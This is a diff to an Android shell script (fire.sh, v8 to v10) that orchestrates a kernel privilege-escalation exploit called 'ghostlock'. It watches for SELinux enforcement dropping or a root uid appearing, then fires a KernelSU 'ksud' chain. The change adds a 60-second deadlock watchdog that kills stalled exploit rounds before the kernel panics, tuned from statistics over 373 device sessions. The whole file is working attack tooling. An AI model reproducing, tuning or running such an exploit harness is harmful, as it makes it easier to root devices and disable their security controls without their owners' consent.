@@ -1,6 +1,15 @@
 #!/system/bin/sh
-# fire.sh v8 - stop the exploit as soon as landing is observed; fire ksud chain
+# fire.sh v10 - stop the exploit as soon as landing is observed; fire ksud chain
 #
+# v10 (2026-11-10): v9 的 10s route_deadlock 窗口回调为 60s（100→600 迭代）。
+#   实机 373 会话统计：成功会话 exploit start→route_done p50=3.5s / p90=9.4s /
+#   max=16.1s，落地（enforce=0）中位 ~9-13s，最长 35s+；10s 窗口会把近半数
+#   成功会话在落地前一刻杀掉（正是"越改成功率越低"的回归模式）。60s 仍早于
+#   实测的 ~60-90s watchdog 崩溃重启，可抢在内核 panic 前收割卡死轮次。
+# v9 (2026-11-10): 新增 route_done 卡死检测 —— 根据 GhostRoot 实机日志分析，
+#   multicast_waiter 路由在 CMP_REQUEUE_PI 后若长期无 route_done，说明
+#   futex 唤醒链卡死，继续等 240s 只会触发 watchdog 硬重启。此时立即
+#   pkill -9 ghostlock，本轮判负，交给上层进入下一轮（干净堆重试）。
 # v8: LANDed 后先持久化单发标记并停止 ghostlock，再调用可能卡住的 b0。
 #     旧顺序把 .fired 写在 b0 之后；b0 卡住时 exploit 会继续跑 W2/W3，
 #     app/host 也看不到 landed 标记，可能重复攻击已污染的内核。
@@ -35,7 +44,7 @@ BOOTID=$(cat /proc/sys/kernel/random/boot_id 2>/dev/null)
 # alive-dedup 失效，06:58:37 二次开火正是这种时序）
 OLDFIRED=$(cat /data/local/tmp/.fired 2>/dev/null)
 if [ -n "$BOOTID" ] && [ "$OLDFIRED" = "$BOOTID" ]; then
-  echo "=== fire v8 $(date +%T) pid=$$ fired_already: .fired matches this boot — LANDED earlier, refusing re-fire ==="
+  echo "=== fire v10 $(date +%T) pid=$$ fired_already: .fired matches this boot — LANDED earlier, refusing re-fire ==="
   exit 0
 fi
 OLD=$(cat $PIDFILE 2>/dev/null)
@@ -44,12 +53,13 @@ OLDBOOT=${OLD#* }
 if [ -n "$OLDPID" ] && [ "$OLDBOOT" = "$BOOTID" ] \
    && [ -d "/proc/$OLDPID" ] \
    && grep -q "fire.sh" "/proc/$OLDPID/cmdline" 2>/dev/null; then
-  echo "=== fire v8 $(date +%T) pid=$$ dedup: watcher pid=$OLDPID alive (same boot) — exit ==="
+  echo "=== fire v10 $(date +%T) pid=$$ dedup: watcher pid=$OLDPID alive (same boot) — exit ==="
   exit 0
 fi
 echo "$$ $BOOTID" > $PIDFILE
-echo "=== fire v8 $(date +%T) pid=$$ ==="
+echo "=== fire v10 $(date +%T) pid=$$ ==="
 i=0
+route_wait_start=0
 while [ $i -lt 33000 ]; do
   e=$(cat /sys/fs/selinux/enforce 2>/dev/null)
   h=$(tr -d '\000' < /data/local/tmp/.l0 2>/dev/null | tail -c 3000 | grep -ac "uid=0(root)")
@@ -83,7 +93,25 @@ while [ $i -lt 33000 ]; do
     echo "exploit_killed ksu_wait=${n} $(date +%T)"
     exit 0
   fi
+  # v10: route_done 卡死检测 —— 若 ghostlock 已跑 60s（600 迭代 × 0.1s）仍无
+  # landing 且 enforce 仍为 1，判定 futex 唤醒链卡死，主动 kill 避免 watchdog
+  # 硬重启。60s 下限的依据：成功会话落地最长达 35s+（373 会话统计），
+  # 10s 窗口（v9）会误杀正常会话 —— 绝不回调此阈值。
+  if pgrep -f "ghostlock" >/dev/null 2>&1; then
+    if [ $route_wait_start -eq 0 ]; then
+      route_wait_start=$i
+    elif [ $((i - route_wait_start)) -gt 600 ]; then
+      # 60秒仍无 landing，主动 kill ghostlock，本轮判负
+      echo "ROUTE_DEADLOCK t=$i $(date +%T) — killing ghostlock to avoid watchdog"
+      pkill -9 -f "/data/local/tmp/ghostlock" 2>/dev/null
+      pkill -9 -x ghostlock 2>/dev/null
+      echo "exploit_killed_route_deadlock $(date +%T)"
+      exit 1
+    fi
+  else
+    route_wait_start=0
+  fi
   i=$((i+1))
   sleep 0.1
 done
-echo "watch_timeout v8 $(date +%T)"
+echo "watch_timeout v10 $(date +%T)"
